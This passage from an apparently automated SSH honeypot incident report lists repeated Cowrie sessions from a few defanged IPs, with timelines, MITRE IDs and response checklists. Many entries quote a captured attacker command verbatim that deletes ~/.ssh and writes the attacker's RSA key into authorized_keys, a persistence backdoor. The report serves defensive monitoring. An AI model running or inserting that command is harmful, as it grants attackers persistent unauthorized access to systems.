| `2026-04-14 21:06:20` | `cowrie.command.failed` |
| `2026-04-14 21:06:20` | `cowrie.log.closed` |
| `2026-04-14 21:06:21` | `cowrie.session.params` |
| `2026-04-14 21:06:21` | `cowrie.command.input` |
| `2026-04-14 21:06:21` | `cowrie.session.file_download` |
| `2026-04-14 21:06:21` | `cowrie.log.closed` |
| `2026-04-14 21:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5458a3b40251

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:06 |
| **Last Seen** | 2026-04-14 21:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:06:24` | `cowrie.session.connect` |
| `2026-04-14 21:06:24` | `cowrie.client.version` |
| `2026-04-14 21:06:25` | `cowrie.client.kex` |
| `2026-04-14 21:06:26` | `cowrie.login.success` |
| `2026-04-14 21:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab967e4ef659

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:06 |
| **Last Seen** | 2026-04-14 21:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:06:31` | `cowrie.session.connect` |
| `2026-04-14 21:06:31` | `cowrie.client.version` |
| `2026-04-14 21:06:31` | `cowrie.client.kex` |
| `2026-04-14 21:06:32` | `cowrie.login.success` |
| `2026-04-14 21:06:33` | `cowrie.session.params` |
| `2026-04-14 21:06:33` | `cowrie.command.input` |
| `2026-04-14 21:06:33` | `cowrie.command.failed` |
| `2026-04-14 21:06:33` | `cowrie.log.closed` |
| `2026-04-14 21:06:34` | `cowrie.session.params` |
| `2026-04-14 21:06:34` | `cowrie.command.input` |
| `2026-04-14 21:06:34` | `cowrie.session.file_download` |
| `2026-04-14 21:06:34` | `cowrie.log.closed` |
| `2026-04-14 21:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5005870e9efd

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:06 |
| **Last Seen** | 2026-04-14 21:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:06:37` | `cowrie.session.connect` |
| `2026-04-14 21:06:37` | `cowrie.client.version` |
| `2026-04-14 21:06:37` | `cowrie.client.kex` |
| `2026-04-14 21:06:39` | `cowrie.login.success` |
| `2026-04-14 21:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-748ae6dbeb1d

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:06 |
| **Last Seen** | 2026-04-14 21:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:06:54` | `cowrie.session.connect` |
| `2026-04-14 21:06:54` | `cowrie.client.version` |
| `2026-04-14 21:06:54` | `cowrie.client.kex` |
| `2026-04-14 21:06:55` | `cowrie.login.success` |
| `2026-04-14 21:06:55` | `cowrie.session.params` |
| `2026-04-14 21:06:55` | `cowrie.command.input` |
| `2026-04-14 21:06:55` | `cowrie.command.failed` |
| `2026-04-14 21:06:55` | `cowrie.log.closed` |
| `2026-04-14 21:06:55` | `cowrie.session.params` |
| `2026-04-14 21:06:55` | `cowrie.command.input` |
| `2026-04-14 21:06:56` | `cowrie.session.file_download` |
| `2026-04-14 21:06:56` | `cowrie.log.closed` |
| `2026-04-14 21:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6cffb426e4

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:06 |
| **Last Seen** | 2026-04-14 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:06:57` | `cowrie.session.connect` |
| `2026-04-14 21:06:57` | `cowrie.client.version` |
| `2026-04-14 21:06:57` | `cowrie.client.kex` |
| `2026-04-14 21:06:58` | `cowrie.login.success` |
| `2026-04-14 21:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4eaa5c5b3c

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:07 |
| **Last Seen** | 2026-04-14 21:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:07:54` | `cowrie.session.connect` |
| `2026-04-14 21:07:54` | `cowrie.client.version` |
| `2026-04-14 21:07:54` | `cowrie.client.kex` |
| `2026-04-14 21:07:55` | `cowrie.login.success` |
| `2026-04-14 21:07:56` | `cowrie.session.params` |
| `2026-04-14 21:07:56` | `cowrie.command.input` |
| `2026-04-14 21:07:56` | `cowrie.command.failed` |
| `2026-04-14 21:07:56` | `cowrie.log.closed` |
| `2026-04-14 21:07:57` | `cowrie.session.params` |
| `2026-04-14 21:07:57` | `cowrie.command.input` |
| `2026-04-14 21:07:57` | `cowrie.session.file_download` |
| `2026-04-14 21:07:57` | `cowrie.log.closed` |
| `2026-04-14 21:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e8784d6b11

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:08 |
| **Last Seen** | 2026-04-14 21:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:08:00` | `cowrie.session.connect` |
| `2026-04-14 21:08:00` | `cowrie.client.version` |
| `2026-04-14 21:08:00` | `cowrie.client.kex` |
| `2026-04-14 21:08:01` | `cowrie.login.success` |
| `2026-04-14 21:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f036c03aa087

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:09 |
| **Last Seen** | 2026-04-14 21:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:09:43` | `cowrie.session.connect` |
| `2026-04-14 21:09:43` | `cowrie.client.version` |
| `2026-04-14 21:09:43` | `cowrie.client.kex` |
| `2026-04-14 21:09:44` | `cowrie.login.success` |
| `2026-04-14 21:09:44` | `cowrie.session.params` |
| `2026-04-14 21:09:44` | `cowrie.command.input` |
| `2026-04-14 21:09:44` | `cowrie.command.failed` |
| `2026-04-14 21:09:45` | `cowrie.log.closed` |
| `2026-04-14 21:09:45` | `cowrie.session.params` |
| `2026-04-14 21:09:45` | `cowrie.command.input` |
| `2026-04-14 21:09:45` | `cowrie.session.file_download` |
| `2026-04-14 21:09:45` | `cowrie.log.closed` |
| `2026-04-14 21:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7997daae0195

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:09 |
| **Last Seen** | 2026-04-14 21:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:09:48` | `cowrie.session.connect` |
| `2026-04-14 21:09:48` | `cowrie.client.version` |
| `2026-04-14 21:09:49` | `cowrie.client.kex` |
| `2026-04-14 21:09:49` | `cowrie.login.success` |
| `2026-04-14 21:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ad5fdd52f47

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:11 |
| **Last Seen** | 2026-04-14 21:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:11:34` | `cowrie.session.connect` |
| `2026-04-14 21:11:34` | `cowrie.client.version` |
| `2026-04-14 21:11:34` | `cowrie.client.kex` |
| `2026-04-14 21:11:35` | `cowrie.login.success` |
| `2026-04-14 21:11:36` | `cowrie.session.params` |
| `2026-04-14 21:11:36` | `cowrie.command.input` |
| `2026-04-14 21:11:36` | `cowrie.command.failed` |
| `2026-04-14 21:11:36` | `cowrie.log.closed` |
| `2026-04-14 21:11:36` | `cowrie.session.params` |
| `2026-04-14 21:11:36` | `cowrie.command.input` |
| `2026-04-14 21:11:37` | `cowrie.session.file_download` |
| `2026-04-14 21:11:37` | `cowrie.log.closed` |
| `2026-04-14 21:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08d9e4a8d69

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:11 |
| **Last Seen** | 2026-04-14 21:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:11:40` | `cowrie.session.connect` |
| `2026-04-14 21:11:40` | `cowrie.client.version` |
| `2026-04-14 21:11:40` | `cowrie.client.kex` |
| `2026-04-14 21:11:41` | `cowrie.login.success` |
| `2026-04-14 21:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707ef5f2df52

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:13 |
| **Last Seen** | 2026-04-14 21:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:13:21` | `cowrie.session.connect` |
| `2026-04-14 21:13:21` | `cowrie.client.version` |
| `2026-04-14 21:13:21` | `cowrie.client.kex` |
| `2026-04-14 21:13:22` | `cowrie.login.success` |
| `2026-04-14 21:13:22` | `cowrie.session.params` |
| `2026-04-14 21:13:22` | `cowrie.command.input` |
| `2026-04-14 21:13:22` | `cowrie.command.failed` |
| `2026-04-14 21:13:23` | `cowrie.log.closed` |
| `2026-04-14 21:13:23` | `cowrie.session.params` |
| `2026-04-14 21:13:23` | `cowrie.command.input` |
| `2026-04-14 21:13:24` | `cowrie.session.file_download` |
| `2026-04-14 21:13:24` | `cowrie.log.closed` |
| `2026-04-14 21:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5185f0101361

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:13 |
| **Last Seen** | 2026-04-14 21:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:13:26` | `cowrie.session.connect` |
| `2026-04-14 21:13:26` | `cowrie.client.version` |
| `2026-04-14 21:13:27` | `cowrie.client.kex` |
| `2026-04-14 21:13:27` | `cowrie.login.success` |
| `2026-04-14 21:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7397e377f2

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:15 |
| **Last Seen** | 2026-04-14 21:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:15:09` | `cowrie.session.connect` |
| `2026-04-14 21:15:09` | `cowrie.client.version` |
| `2026-04-14 21:15:09` | `cowrie.client.kex` |
| `2026-04-14 21:15:10` | `cowrie.login.success` |
| `2026-04-14 21:15:11` | `cowrie.session.params` |
| `2026-04-14 21:15:11` | `cowrie.command.input` |
| `2026-04-14 21:15:11` | `cowrie.command.failed` |
| `2026-04-14 21:15:11` | `cowrie.log.closed` |
| `2026-04-14 21:15:11` | `cowrie.session.params` |
| `2026-04-14 21:15:11` | `cowrie.command.input` |
| `2026-04-14 21:15:12` | `cowrie.session.file_download` |
| `2026-04-14 21:15:12` | `cowrie.log.closed` |
| `2026-04-14 21:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-602c5f1999e9

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 21:15 |
| **Last Seen** | 2026-04-14 21:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:15:15` | `cowrie.session.connect` |
| `2026-04-14 21:15:15` | `cowrie.client.version` |
| `2026-04-14 21:15:15` | `cowrie.client.kex` |
| `2026-04-14 21:15:16` | `cowrie.login.success` |
| `2026-04-14 21:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749a6ea54f8c

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:16 |
| **Last Seen** | 2026-04-14 21:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:16:02` | `cowrie.session.connect` |
| `2026-04-14 21:16:02` | `cowrie.client.version` |
| `2026-04-14 21:16:03` | `cowrie.client.kex` |
| `2026-04-14 21:16:03` | `cowrie.login.success` |
| `2026-04-14 21:16:03` | `cowrie.session.params` |
| `2026-04-14 21:16:03` | `cowrie.command.input` |
| `2026-04-14 21:16:03` | `cowrie.command.failed` |
| `2026-04-14 21:16:03` | `cowrie.log.closed` |
| `2026-04-14 21:16:03` | `cowrie.session.params` |
| `2026-04-14 21:16:03` | `cowrie.command.input` |
| `2026-04-14 21:16:04` | `cowrie.session.file_download` |
| `2026-04-14 21:16:04` | `cowrie.log.closed` |
| `2026-04-14 21:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72d49db2285

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:16 |
| **Last Seen** | 2026-04-14 21:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:16:05` | `cowrie.session.connect` |
| `2026-04-14 21:16:05` | `cowrie.client.version` |
| `2026-04-14 21:16:05` | `cowrie.client.kex` |
| `2026-04-14 21:16:06` | `cowrie.login.success` |
| `2026-04-14 21:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101133deb81a

